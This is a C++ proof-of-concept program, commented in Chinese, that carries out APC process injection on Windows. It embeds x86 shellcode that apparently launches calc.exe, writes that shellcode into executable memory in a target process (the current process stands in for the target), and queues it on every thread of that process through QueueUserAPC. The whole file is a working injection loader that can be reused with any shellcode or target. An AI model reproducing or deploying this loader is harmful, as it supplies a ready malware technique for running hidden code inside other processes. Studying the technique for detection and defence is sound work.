#include <windows.h>
#include <tlhelp32.h>
#include <vector>

int main()
{
	char shellcode[] = "\x50\x53\x51\x52\x56\x57\x55\x89\xE5\x83\xEC\x18\x31\xF6\x56\x68\x78\x65\x63\x00\x68\x57\x69\x6E\x45\x89\x65\xFC\x64\x8B\x1D\x30\x00\x00\x00\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5B\x10\x89\x5D\xF8\x8B\x43\x3C\x01\xD8\x8B\x40\x78\x01\xD8\x8B\x48\x24\x01\xD9\x89\x4D\xF4\x8B\x78\x20\x01\xDF\x89\x7D\xF0\x8B\x50\x1C\x01\xDA\x89\x55\xEC\x8B\x50\x14\x31\xC0\x8B\x7D\xF0\x8B\x75\xFC\x31\xC9\xFC\x8B\x3C\x87\x01\xDF\x66\x83\xC1\x08\xF3\xA6\x74\x0A\x40\x39\xD0\x72\xE5\x83\xC4\x24\xEB\x3F\x8B\x4D\xF4\x8B\x55\xEC\x66\x8B\x04\x41\x8B\x04\x82\x01\xD8\x31\xD2\x52\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x68\x6D\x33\x32\x5C\x68\x79\x73\x74\x65\x68\x77\x73\x5C\x53\x68\x69\x6E\x64\x6F\x68\x43\x3A\x5C\x57\x89\xE6\x6A\x0A\x56\xFF\xD0\x83\xC4\x44\x5D\x5F\x5E\x5A\x59\x5B\x58\xC3";

	// 1. 取得目標 Process ID，因為是 x86 Shellcode，所以要找 32-bit Process，這邊用當前的 Process 代替
	DWORD pid = GetCurrentProcessId();

	// 2. 開啟目標 Process，申請一塊記憶體後把 Shellcode 寫入目標 Process
	HANDLE victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(victimProcess, shellAddress, shellcode, sizeof(shellcode), NULL);
	
	// 3. 建立 Process、Thread 快照，迴圈跑過所有 Thread，列舉所有在目標 Process 中的 Thread ID
	THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
	std::vector<DWORD> threadIds;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (Thread32First(snapshot, &threadEntry))
	{
		do {
			if (threadEntry.th32OwnerProcessID == pid)
			{
				threadIds.push_back(threadEntry.th32ThreadID);
			}
		} while (Thread32Next(snapshot, &threadEntry));
	}

	// 4. 迴圈跑過所有目標 Process 中的 Thread，呼叫 QueueUserAPC 並把 APC Function 設為我們的 Shellcode
	for (DWORD threadId : threadIds)
	{
		HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadId);
		QueueUserAPC((PAPCFUNC)shellAddress, threadHandle, NULL);
	}

	// 5. 呼叫 Sleep 讓當前的 Thread 進入 Alertable 狀態
	Sleep(1000);
	return 0;
}